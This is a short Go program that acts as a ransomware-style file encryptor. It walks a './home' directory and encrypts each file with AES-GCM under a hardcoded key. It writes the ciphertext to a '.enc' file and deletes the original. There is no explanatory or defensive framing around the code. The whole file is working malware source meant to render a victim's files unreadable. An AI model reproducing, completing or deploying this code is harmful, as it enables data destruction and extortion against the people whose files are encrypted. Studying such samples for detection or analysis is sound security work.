package main

import (
	"crypto/aes"
	"crypto/cipher"
	"crypto/rand"
	"fmt"
	"io"
	"os"
	"path/filepath"
)

func check(e error) {
	defer func() {
		if r := recover(); r != nil {
			fmt.Println("Error Recovery:", r)
		}
	}()
	if e != nil {
		panic(e)
	}
}


func main() {
	// initialize AES in GCM mode
	key := []byte("$B&E)H@McQfThWmZq4t7w!z%C*F-JaNd")
	block, err := aes.NewCipher(key)
	check(err)
	gcm, err := cipher.NewGCM(block)
	check(err)

	// looping through the target files
	filepath.Walk("./home", func(path string, info os.FileInfo, err error) error {
		if !info.IsDir() {
			fmt.Println("Encrypting " + path + "...")     // encrypt the file

			// read file contents
			original, err := os.ReadFile(path)
			check(err)
			
			// encrypt bytes
			nonce := make([]byte, gcm.NonceSize())
			_, err = io.ReadFull(rand.Reader, nonce)
			check(err)
			encrypted := gcm.Seal(nonce, nonce, original, nil)

			// write the encrypted contents to file with a .enc extension
			err = os.WriteFile(path + ".enc", encrypted, 0666)
			check(err)
			os.Remove(path) // delete the original file
		}
		return nil
	})
}
